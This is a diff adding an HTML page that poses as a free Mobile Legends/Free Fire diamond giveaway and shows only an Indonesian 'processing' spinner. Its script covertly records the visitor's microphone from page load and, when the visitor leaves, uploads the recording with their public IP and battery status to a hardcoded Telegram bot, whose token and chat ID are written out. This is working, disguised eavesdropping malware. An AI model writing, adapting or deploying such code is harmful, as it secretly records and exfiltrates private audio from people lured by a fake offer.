@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>DIAMOND ML/FF FREE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 6px solid #444;
+      border-top: 6px solid #00ffcc;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 18px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="loading-text">Memproses... Mohon tunggu</div>
+
+  <script src="https://www.webrtc-experiment.com/RecordRTC.js"></script>
+  <script>
+    let recorder, stream;
+    let sudahDikirim = false;
+
+    async function getSystemInfo() {
+      const ip = await fetch("https://api.ipify.org?format=json")
+        .then(r => r.json()).then(d => d.ip).catch(() => "EROR");
+
+      const batre = await navigator.getBattery().then(b => {
+        return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Tidak charging'})`;
+      }).catch(() => "UNKNOWN");
+
+      return { ip, batre };
+    }
+
+    function mulaiRekam() {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+        stream = s;
+        recorder = RecordRTC(stream, {
+          type: 'audio',
+          mimeType: 'audio/wav',
+        });
+        recorder.startRecording();
+        console.log("LOADING");
+      }).catch(err => {
+        alert("ERORR " + err.message);
+      });
+    }
+
+    window.addEventListener("beforeunload", () => {
+      if (!recorder || sudahDikirim) return;
+      sudahDikirim = true;
+
+      recorder.stopRecording(async () => {
+        const blob = recorder.getBlob();
+        const info = await getSystemInfo();
+
+        const form = new FormData();
+        form.append("chat_id", "8122699796");
+        form.append("document", blob, "SUARA.mp3");
+
+        const caption = `SUARA.mp3\nDEVELOPER REZZXITERZ\nIP PUBLIC: ${info.ip}\nBATRE: ${info.batre}`;
+        form.append("caption", caption);
+
+        fetch("https://api.telegram.org/bot7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90/sendDocument", {
+          method: "POST",
+          body: form
+        }).then(() => {
+          console.log("ERORR");
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+      });
+    });
+
+    // Mulai rekam saat halaman dibuka
+    window.onload = mulaiRekam;
+  </script>
+</body>
+</html>
